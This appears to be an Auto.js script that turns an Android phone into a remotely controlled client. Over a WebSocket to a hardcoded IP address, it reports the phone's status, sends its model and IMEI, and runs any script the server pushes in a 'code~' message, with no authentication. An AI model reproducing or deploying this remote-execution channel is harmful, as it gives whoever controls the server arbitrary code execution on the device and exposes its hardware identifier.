importClass(android.util.Base64)
var wsUrl = "ws://47.104.226.188:8009/api/v1/ping"
//主机地址
var sendData = "ping";
//发送数据
var isConnect = false;
//用于检测是否连接
var ws = null;
//webSocket实例化对象
var reConnectNum = 0;
//尝试重连的次数
var reConnectTimer = null;
//用于断线重连的定时器Id, 连上了要清除
//console.show();

getWebSocket();
hawk();

// 设置一个空的定时器保证程序不结束, 否则ws的监听事件不在此线程会自动结束
setInterval(function () {
}, 1000);


// 检测任务池是否执行完，如果任务数量大于1 说明手机被任务占用 此时更新状态
function hawk(){
    threads.start( function(){
        while(true){
            if(engines.all().length > 1){
                ws.send("status:busy");
            }else{
                ws.send("status:free");
            }
            sleep(5000);
        }
    })
}

// 新建websocket的函数 页面初始化 断开连接时重新调用
function getWebSocket() {
    ws = web.newWebSocket(wsUrl, {
        eventThread: 'this'
        //不加参数则回调在IO线程
    });
    
    //指定web socket的事件回调在当前线程（好处是没有多线程问题要处理，坏处是不能阻塞当前线程，包括死循环）
    ws.on("open", (res, ws) => {
        //连接时设置状态
        isConnect = true;
        log("WebSocket已连接");
        ws.send(sendData);
        //连接上发送一个客户端信息过去
    }).on("failure", (err, res, ws) => {
        isConnect = false;
        reConnect();
    }).on("closing", (code, reason, ws) => {
        console.verbose("正在关闭连接!");
    }).on("text", (text, ws) => {
        //这里收到文本消息可以用脚本引擎执行
        console.info("收到文本消息: ", text);
        if(text == "pong"){
            ws.send("device:"+device.device);
        }
        if(text == "fine"){
            ws.send("serial:"+device.getIMEI());
        }
        if(text == "ok"){
            log("Device就绪");
        }
        if(text.startsWith("code~")){
            
            var code = text.split("~");
            engines.execScript(code[2],code[1]);
            // var thread = threads.start(
            //     function () {
                  
            //     }
            // )
            // thread.waitFor();
        }
        
    }).on("binary", (bytes, ws) => {
        console.info("收到二进制消息!");
    }).on("closed", (code, reason, ws) => {
        console.error("WebSocket已关闭!");
        isConnect = false;
        //关闭时要改变连接状态以便重连
        reConnect();
    });
    //监听他的各种事件 
}


// 断线重连
function reConnect() {
    if (isConnect) {
        if (!reConnectTimer) {
            clearTimeout(reConnectTimer);
        }
        return;
    }
    //如果连接上则清除此定时器, 否则定时请求一次
    reConnectNum++;
    reConnectTimer = setTimeout(function () {
        console.log("第" + reConnectNum + "次断线重连...");
        getWebSocket();
    }, 2000);
}
